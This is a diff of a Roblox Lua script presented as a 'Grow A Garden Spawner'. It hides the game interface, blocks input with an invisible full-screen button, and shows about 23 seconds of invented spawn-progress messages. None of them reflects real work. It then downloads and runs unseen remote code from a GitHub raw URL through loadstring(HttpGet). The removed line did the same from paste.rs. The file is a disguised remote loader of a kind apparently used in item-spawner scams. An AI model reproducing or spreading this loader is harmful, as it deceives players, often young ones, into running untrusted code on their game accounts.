@@ -1,1 +1,108 @@
-loadstring(game:HttpGet('https://paste.rs/cnnbo'))()
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local player = Players.LocalPlayer
+
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.Name = "🌴 Grow A Garden Spawner"
+screenGui.Parent = player:WaitForChild("PlayerGui")
+
+local fadeFrame = Instance.new("Frame")
+fadeFrame.Size = UDim2.new(1, 0, 1, 0)
+fadeFrame.Position = UDim2.new(0, 0, 0, 0)
+fadeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+fadeFrame.BackgroundTransparency = 1
+fadeFrame.ZIndex = 10
+fadeFrame.Parent = screenGui
+
+local blocker = Instance.new("TextButton")
+blocker.Size = UDim2.new(1, 0, 1, 0)
+blocker.Position = UDim2.new(0, 0, 0, 0)
+blocker.Text = ""
+blocker.AutoButtonColor = false
+blocker.BackgroundTransparency = 1
+blocker.ZIndex = 11
+blocker.Parent = fadeFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0.1, 0)
+title.Position = UDim2.new(0, 0, 0.35, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.TextScaled = true
+title.ZIndex = 12
+title.Text = "🌴 Grow A Garden Spawner"
+title.Parent = fadeFrame
+
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0.1, 0)
+label.Position = UDim2.new(0, 0, 0.47, 0)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextTransparency = 1
+label.Font = Enum.Font.GothamBold
+label.TextScaled = true
+label.ZIndex = 12
+label.Text = ""
+label.Parent = fadeFrame
+
+local messages = {
+    "🗃️ Loading spawn configurations...",
+    "⚙️ Initializing spawn scheduler...",
+    "🔍 Scanning available spawn points...",
+    "📡 Syncing spawn data with server...",
+    "📦 Loading spawn assets...",
+    "📊 Preparing spawn priority queue...",
+    "⏳ Calculating spawn timers...",
+    "🛠️ Setting spawn cooldowns...",
+    "🎯 Targeting spawn locations...",
+    "🔄 Refreshing spawn pools...",
+    "📥 Caching spawn metadata...",
+    "🚀 Starting spawn routines...",
+    "🔧 Verifying asset integrity...",
+    "📍 Locking spawn zones...",
+    "📝 Logging spawn events...",
+    "⚡ Optimizing spawn rates...",
+    "🧩 Assembling spawn groups...",
+    "🔐 Securing spawn triggers...",
+    "📜 Applying spawn rules...",
+    "🎉 Finalizing spawner setup...",
+    "✅ Spawner initialization complete!"
+}
+
+-- Fade in quickly
+for i = 1, 20 do
+    local alpha = 1 - (i / 20)
+    fadeFrame.BackgroundTransparency = alpha
+    title.TextTransparency = alpha
+    label.TextTransparency = alpha
+    wait(0.02) -- faster fade-in (0.02 instead of 0.03)
+end
+
+local duration = 23
+local delay = duration / #messages
+
+for _, msg in ipairs(messages) do
+    label.Text = msg
+    wait(delay)
+end
+
+-- Fade out faster with zero delay after
+for i = 1, 20 do
+    local alpha = i / 20
+    fadeFrame.BackgroundTransparency = alpha
+    title.TextTransparency = alpha
+    label.TextTransparency = alpha
+    wait(0.01) -- faster fade-out
+end
+
+screenGui:Destroy()
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+
+-- Immediately run the spawner script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdkduejdo/DarkV5/refs/heads/main/DarkSpawnerV5"))()
